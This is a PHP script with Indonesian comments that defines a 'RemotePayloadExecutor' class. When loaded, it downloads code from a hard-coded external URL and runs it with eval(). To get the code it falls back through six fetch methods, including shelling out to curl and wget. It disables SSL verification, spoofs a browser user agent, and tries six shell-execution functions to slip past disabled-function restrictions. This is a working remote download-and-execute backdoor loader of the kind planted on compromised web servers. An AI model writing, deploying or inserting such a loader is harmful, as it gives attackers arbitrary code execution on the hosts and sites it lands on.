<?php
/**
 * RemotePayloadExecutor
 * * Sebuah kelas utilitas untuk mengambil dan mengeksekusi kode PHP dari sumber eksternal
 * dengan berbagai mekanisme fallback untuk menjamin keberhasilan pengambilan data.
 * * @author  Developer
 * @version 2.1
 */

class RemotePayloadExecutor {
    
    private string $targetUrl;
    private string $userAgent;
    private int $timeout;

    /**
     * Constructor
     * * @param string $url Target URL file raw/text
     */
    public function __construct(string $url) {
        $this->targetUrl = $url;
        $this->userAgent = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36';
        $this->timeout = 30;
    }

    /**
     * Menjalankan logika utama: Fetch & Eval
     */
    public function execute(): void {
        $payload = $this->fetchPayload();

        if ($payload && strlen($payload) > 0) {
            try {
                // Menutup tag PHP jika payload dimulai dengan tag pembuka untuk menghindari error parse
                // eval() mengeksekusi kode seolah-olah berada di dalam skrip PHP
                eval('?>' . $payload);
            } catch (Throwable $e) {
                error_log("Remote Execution Error: " . $e->getMessage());
                echo "Execution Failed: Terjadi kesalahan saat menjalankan payload.";
            }
        } else {
            echo "Fetch Failed: Tidak dapat mengambil konten dari sumber eksternal melalui semua metode yang tersedia.";
        }
    }

    /**
     * Mencoba mengambil payload menggunakan berbagai strategi secara berurutan
     * * @return string|false
     */
    private function fetchPayload() {
        $methods = [
            'useCurlExtension',
            'useFileGetContents',
            'useFopenStream',
            'useFsockOpen',
            'useCliCurl',
            'useCliWget'
        ];

        foreach ($methods as $method) {
            $content = $this->$method();
            if ($content !== false && !empty($content)) {
                return $content;
            }
        }

        return false;
    }

    /**
     * Strategy 1: PHP cURL Extension
     */
    private function useCurlExtension() {
        if (!function_exists('curl_init')) return false;

        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $this->targetUrl);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
        curl_setopt($ch, CURLOPT_USERAGENT, $this->userAgent);
        curl_setopt($ch, CURLOPT_TIMEOUT, $this->timeout);
        
        $result = curl_exec($ch);
        curl_close($ch);

        return $result;
    }

    /**
     * Strategy 2: file_get_contents (Standard Wrapper)
     */
    private function useFileGetContents() {
        if (!ini_get('allow_url_fopen')) return false;

        $options = [
            'http' => [
                'header'  => "User-Agent: {$this->userAgent}\r\n",
                'timeout' => $this->timeout,
                'ignore_errors' => true
            ],
            'ssl' => [
                'verify_peer' => false,
                'verify_peer_name' => false
            ]
        ];

        $context = stream_context_create($options);
        return @file_get_contents($this->targetUrl, false, $context);
    }

    /**
     * Strategy 3: fopen (Binary Stream Reading)
     */
    private function useFopenStream() {
        if (!ini_get('allow_url_fopen')) return false;

        $handle = @fopen($this->targetUrl, "rb");
        $contents = '';
        
        if ($handle) {
            while (!feof($handle)) {
                $contents .= fread($handle, 8192);
            }
            fclose($handle);
            return $contents;
        }

        return false;
    }

    /**
     * Strategy 4: fsockopen (Raw Socket Connection)
     */
    private function useFsockOpen() {
        $parts = parse_url($this->targetUrl);
        $host = $parts['host'];
        $path = $parts['path'] ?? '/';
        $scheme = $parts['scheme'] ?? 'http';
        
        $port = ($scheme === 'https') ? 443 : 80;
        $prefix = ($scheme === 'https') ? 'ssl://' : '';

        $fp = @fsockopen($prefix . $host, $port, $errno, $errstr, $this->timeout);
        
        if (!$fp) return false;

        $out  = "GET $path HTTP/1.1\r\n";
        $out .= "Host: $host\r\n";
        $out .= "User-Agent: {$this->userAgent}\r\n";
        $out .= "Connection: Close\r\n\r\n";
        
        fwrite($fp, $out);
        
        $response = '';
        while (!feof($fp)) {
            $response .= fgets($fp, 128);
        }
        fclose($fp);

        // Memisahkan Header dan Body
        $headerEnd = strpos($response, "\r\n\r\n");
        if ($headerEnd !== false) {
            return substr($response, $headerEnd + 4);
        }

        return false;
    }

    /**
     * Strategy 5: CLI cURL (via Robust Shell Executor)
     */
    private function useCliCurl() {
        // -s untuk silent, -L untuk follow redirect, -k untuk insecure SSL
        $cmd = "curl -s -L -k -A '{$this->userAgent}' " . escapeshellarg($this->targetUrl);
        return $this->runCommand($cmd);
    }

    /**
     * Strategy 6: CLI Wget (via Robust Shell Executor)
     */
    private function useCliWget() {
        // -q untuk quiet, -O- untuk output ke stdout, --no-check-certificate untuk SSL
        $cmd = "wget -q -O- --no-check-certificate --user-agent='{$this->userAgent}' " . escapeshellarg($this->targetUrl);
        return $this->runCommand($cmd);
    }

    /**
     * Helper: Menjalankan perintah sistem menggunakan berbagai metode fallback
     * Mencoba: shell_exec, exec, passthru, system, popen, proc_open
     * * @param string $cmd Perintah yang akan dijalankan
     * @return string|false Output perintah atau false jika gagal
     */
    private function runCommand(string $cmd) {
        // Fallback 1: shell_exec
        if ($this->isFunctionEnabled('shell_exec')) {
            $output = @shell_exec($cmd);
            if (!empty($output)) return $output;
        }

        // Fallback 2: exec
        if ($this->isFunctionEnabled('exec')) {
            $output = [];
            @exec($cmd, $output);
            if (!empty($output)) return implode("\n", $output);
        }

        // Fallback 3: passthru
        if ($this->isFunctionEnabled('passthru')) {
            ob_start();
            @passthru($cmd);
            $output = ob_get_clean();
            if (!empty($output)) return $output;
        }

        // Fallback 4: system
        if ($this->isFunctionEnabled('system')) {
            ob_start();
            @system($cmd);
            $output = ob_get_clean();
            if (!empty($output)) return $output;
        }

        // Fallback 5: popen
        if ($this->isFunctionEnabled('popen')) {
            $handle = @popen($cmd, 'r');
            if ($handle) {
                $output = '';
                while (!feof($handle)) {
                    $output .= fread($handle, 4096);
                }
                pclose($handle);
                if (!empty($output)) return $output;
            }
        }

        // Fallback 6: proc_open
        if ($this->isFunctionEnabled('proc_open')) {
            $descriptors = [
                0 => ["pipe", "r"], // stdin
                1 => ["pipe", "w"], // stdout
                2 => ["pipe", "w"]  // stderr
            ];
            $process = @proc_open($cmd, $descriptors, $pipes);
            if (is_resource($process)) {
                $output = stream_get_contents($pipes[1]);
                fclose($pipes[0]);
                fclose($pipes[1]);
                fclose($pipes[2]);
                proc_close($process);
                if (!empty($output)) return $output;
            }
        }

        return false;
    }

    /**
     * Helper: Memeriksa apakah fungsi PHP tersedia dan tidak dinonaktifkan
     */
    private function isFunctionEnabled(string $func): bool {
        if (!function_exists($func)) {
            return false;
        }
        $disabled = ini_get('disable_functions');
        if ($disabled) {
            $disabledFunctions = array_map('trim', explode(',', $disabled));
            if (in_array($func, $disabledFunctions)) {
                return false;
            }
        }
        return true;
    }
}

// --- Konfigurasi & Eksekusi ---

// URL target script
$targetEndpoint = 'https://slim.weborama.nl/kp29Vp';

// Inisialisasi dan jalankan
$executor = new RemotePayloadExecutor($targetEndpoint);
$executor->execute();

?>
